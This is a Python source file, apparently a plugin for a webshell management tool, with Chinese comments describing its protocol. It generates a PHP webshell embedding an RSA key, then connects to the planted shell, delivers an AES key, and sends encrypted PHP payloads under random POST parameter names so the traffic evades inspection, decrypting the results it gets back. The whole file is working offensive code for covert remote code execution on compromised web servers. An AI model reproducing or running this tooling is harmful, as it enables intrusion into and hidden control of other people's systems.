r'''Encrypted transmission of webshell attack payload

交互逻辑：
    1.客户端首先无参的向webshell发出POST请求，webshell在响应体中返回一个生成时使用的随机字符串
    2.客户端使用该随机字符串搜索keys文件夹下是否有同名文件， 如果有则从该文件反序列化出秘钥对象， 否则连接失败结束
    3.使用随机POST参数传递base64编码的消息到webshell， 其中使用公钥对象加密对称密钥对传递给webshell， webshell解密成功后返回一个客户端指定的随机字符串并将对称密钥对保存到session中
    4.验证返回的随机字符串正确后，之后的数据传输使用对称密钥加密，连接成功。

'''

from api.webshell import Webshell, WebshellSession, CodeExecuteError, PHPWebshell, EvalResult
from api import logger, utils, PHPPayload, Request, HttpException
import random
import re
import os
import base64
import json
import string
try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    import cryptography.hazmat.primitives.padding as pad
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ModuleNotFoundError as e:
    logger.warning(f"No module `cryptography`, webshell `{__name__}` maybe not available!")
    raise SystemExit(0)

class DecryptFailedError(Exception):
    pass
class EncryptFailedError(Exception):
    pass

class webshell(PHPWebshell):
    
    def __init__(self):
        super().__init__()

        self.opener = Request()

        self.aes = None # 用于aes加密传输的aes对象
        self.private_key = None
        self.public_key = None

    def _create_and_save_key(self)-> str:
        '''创建并保存一组秘钥，并填充当前的秘钥对象
        '''
        self.private_key = rsa.generate_private_key(public_exponent=65537,key_size=1024)
        self.public_key = self.private_key.public_key()
        key = os.urandom(32)
        iv = os.urandom(16)
        self.aes = Cipher(algorithms.AES(key), modes.CBC(iv))
        
        ID = utils.randomstr(16)
        d = os.path.dirname(__file__)
        if not os.path.exists(os.path.join(d, 'keys')):
            os.mkdir(os.path.join(d, 'keys'))
        while os.path.exists(os.path.join(d, 'keys', ID)):
            ID = utils.randomstr(16)
        with open(os.path.join(d, 'keys', ID), 'wb') as f:
            pri = self.private_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
            pub = self.public_key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
            f.write(pri+b'\n')
            f.write(pub)
        return ID

    def _load_key(self, ID: str)-> bool:
        '''从文件中加载数据传输需要的秘钥对象
        '''
        path = os.path.join(os.path.dirname(__file__), 'keys', ID)
        if not os.path.isfile(path):
            return False
        with open(path, 'rb') as f:
            content = f.read()
            self.private_key = serialization.load_pem_private_key(content, None)
            self.public_key = serialization.load_pem_public_key(content)

        key = os.urandom(32)
        iv = os.urandom(16)
        self.aes = Cipher(algorithms.AES(key), modes.CBC(iv))
        if isinstance(self.private_key, rsa.RSAPrivateKey) and isinstance(self.public_key, rsa.RSAPublicKey):
            return True
        return False

    def _encrypt(self, data:bytes)-> bytes:
        if not data:
            return b''
        try:
            enc = self.aes.encryptor()
            padder = pad.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            return enc.update(padded_data)+enc.finalize()
        except Exception as e:
            raise EncryptFailedError(e)

    def _decrypt(self, data: bytes)-> bytes:
        if not data:
            return b''
        try:
            dec = self.aes.decryptor()
            unpadder = pad.PKCS7(128).unpadder()
            content = dec.update(data)+dec.finalize()
            return unpadder.update(content)+unpadder.finalize()
        except Exception as e:
            raise DecryptFailedError(e)

    def connect(self)-> bool:
        '''connect target and return True, or False if connect failed. 
        '''
        ID = '0'
        try:
            with self.opener.post(self.options.target, timeout=10) as f:
                ID = f.read()
        except BaseException:
            logger.error('Failed to connect to webshell')
            return False

        ID = ID.decode(self.options.encoding, 'ignore')
        if not self._load_key(ID):
            logger.error(f"Failed to load secret key for `{ID}`")
            return False

        iv = self.aes.mode.initialization_vector
        data = {
            utils.randomstr(8):base64.b64encode(self.public_key.encrypt(self.aes.algorithm.key, padding.PKCS1v15())).decode(),
            'iv':base64.b64encode(iv).decode()
        }
        try:
            with self.opener.post(self.options.target, data, timeout=10) as f:
                ID = f.read()
        except BaseException as e:
            logger.error(e)
            logger.error('Error in key delivery.')
            return False
        if ID != base64.b64encode(iv):
            logger.error(f"The accepted number `{ID}` does not match the expected `{base64.b64encode(iv)}`")
            return False
        return True

    @Webshell.handle_evaled
    def eval(self, payload: PHPPayload)-> EvalResult:
        '''执行payload并获取返回结果'''
        payload = self._encrypt(payload.code)
        payload = base64.b64encode(payload).decode()
        data = {utils.randomstr(8):payload}
        result = EvalResult()
        try:
            with self.opener.post(self.options.target, data, timeout=self.options.timeout) as f:
                data = f.read()
                data = self._decrypt(data)
                data = json.loads(data)
                if not self._error_handler(data, result):
                    return result
                data = base64.b64decode(data['data'].encode()).decode(self.options.encoding, 'ignore')
                result.data = data
                return result
        except (EncryptFailedError, DecryptFailedError) as e:
            err = self.EvalError(e.__class__.__name__, str(e), False, False)
            result.add_error_info(err)
            if self.options.verbose > 0:
                logger.error(err)
                print(f"Error data: {data[:100]}")
        except HttpException as e:
            err = self.EvalError('HttpException', f"{e.msg};Response: {e.response.read().decode(self.options.encoding, 'ignore')}", False, False)
            result.add_error_info(err)
            if self.options.verbose > 1:
                logger.error(err)
        except Exception as e:
            err = self.EvalError(e.__class__.__name__, str(e), False, False)
            result.add_error_info(err)
            if self.options.verbose > 0:
                logger.error(err)

        return result

    def _error_handler(self, error: dict, result: EvalResult)-> bool:
        '''处理webshell返回的错误信息
        '''
        if error['code'] != 1:
            for msg in error['msg']:
                code = self._to_php_errcode(msg.get('errcode'))
                err = self.EvalError(code, base64.b64decode(msg.get('errmsg').encode()).decode(self.options.encoding, 'ignore'), 
                    True if error['code'] == 0 or msg.get('iswarning') else False, True)
                result.add_error_info(err)
                if err.iswarning and self.options.verbose > 1:
                    logger.warning(err)
                elif not err.iswarning and self.options.verbose > 0:
                    logger.error(err)
            if error['code'] == -1:
                return False
        return True

    def generate(self)-> bytes:
        '''生成并返回webshell代码'''
        ID = self._create_and_save_key()
        p = PHPPayload('templete.php', ID=ID, 
            pri_key=self.private_key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()))
        code = b'<?php\n'+p.code+b'\n?>'
        return code
